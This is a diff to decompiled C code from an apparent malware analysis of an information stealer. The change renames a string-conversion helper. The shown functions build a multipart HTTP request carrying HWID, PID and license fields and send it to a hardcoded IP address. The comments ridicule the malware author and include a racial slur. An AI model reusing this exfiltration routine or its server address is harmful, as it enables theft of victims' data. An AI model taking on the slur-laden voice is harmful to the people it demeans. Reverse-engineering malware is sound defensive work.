@@ -15,7 +15,7 @@ size_t __cdecl PrcssingMultipartRequest(void *dataToSend, size_t dataSize, size_
     bufferOffset = unused1;
     currentPosition = *_bffSize;
 
-    ShitiStr = convertWideToAnsi(&globalData); // same fcking globalData btw
+    ShitiStr = ProccessingOrMapsTheWideCharacter(&globalData); // same fcking globalData btw
     bffSize = *_bffSize;
     *(_WORD *)(*_bffSize + bufferOffset) = 11565;
     memmove((void *)(bffSize + bufferOffset + 2), ShitiStr, strlen(ShitiStr));
@@ -46,7 +46,7 @@ int __fastcall AddRequestParameter(int requestBufferOffset, const void *paramete
     CHAR *wideStrProcessed; int currentOffset; unsigned int finalOffset; unsigned int tempSize;
     int result; unsigned int processedLength;
 
-    wideStrProcessed = convertWideToAnsi(&WideCharStr);
+    wideStrProcessed = ProccessingOrMapsTheWideCharacter(&WideCharStr);
     currentOffset = *_bffSize;
     *(_WORD *)(*_bffSize + requestBufferOffset) = 11565;
     memmove((void *)(requestBufferOffset + currentOffset + 2), wideStrProcessed, strlen(wideStrProcessed));
@@ -91,10 +91,9 @@ int32_t __fastcall ProcessAndSendData(int32_t* SysInfo)
     char* headerBuffer = Alloc(0x800);
     void* requestData = Alloc((char*)buffer + 0x1000);
     char const* const contentType = "Content-Type: multipart/form-data";
-    PSTR formattedData = convertWideToAnsi(&globalData);
+    PSTR formattedData = ProccessingOrMapsTheWideCharacter(&globalData);
     // that globalData are awesome, is some next-level trash -_-, just a hardcoded mess with random junk like "aj195iak20ka99441aj1". This "genius" dev thinks this is clever, but nah—it’s probably some weak attempt at generating a HWID or a stolen key for auth, who knows? It's like they couldn't even come up with a real idea.  
-    // They’re calling ProcessingTheWideStr() like it's doing some serious stuff, but it's just butchering the data to make it look like it's doing work—total waste of time.  
-    // Now, they take that mangled mess and throw it into a multipart HTTP request with "Content-Type: multipart/form-data; boundary=". Nigga WWtf is that, This is their big idea? Sending stolen info in the most obvious way possible?  
+    // they take that mangled mess and throw it into a multipart HTTP request with "Content-Type: multipart/form-data; boundary=". Nigga WWtf is that, This is their big idea? Sending stolen info in the most obvious way possible?  
     // The dev’s probably thinking theyre soo slick, but theyre just out here grabbing basic stuff like HWID, PID, lid, and sending it to a server. This is barely even hacking. It's scraping system info, tossing it into a server request, and calling it "data exfiltration" How original.  
     // They even throw in an IP address "195.123.226.91" what a genius (lol). Grabbing an IP like it’s something special. Like no ones ever done that before.  
     // lol, i cant reverse lazy data-stealing tool, thats enough cobbled together by some skiddie dev who probably thinks theyre reinventing the wheel. just taking stuff that's already there and sending it out in the most basic, amateur way possible
@@ -137,7 +136,7 @@ int32_t __fastcall ProcessAndSendData(int32_t* SysInfo)
     AddRequestParameter(&responseStatus, "pid", requestData, sessionStr, &responseStatus);
     AddRequestParameter(&responseStatus, "lid", requestData, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", &responseStatus);
     
-    convertWideToAnsi(u"195.123.226.91");
+    ProccessingOrMapsTheWideCharacter(u"195.123.226.91");
     SendWebRequest(headerBuffer, requestData, responseStatus);
     
     return _free(tempBuffer);
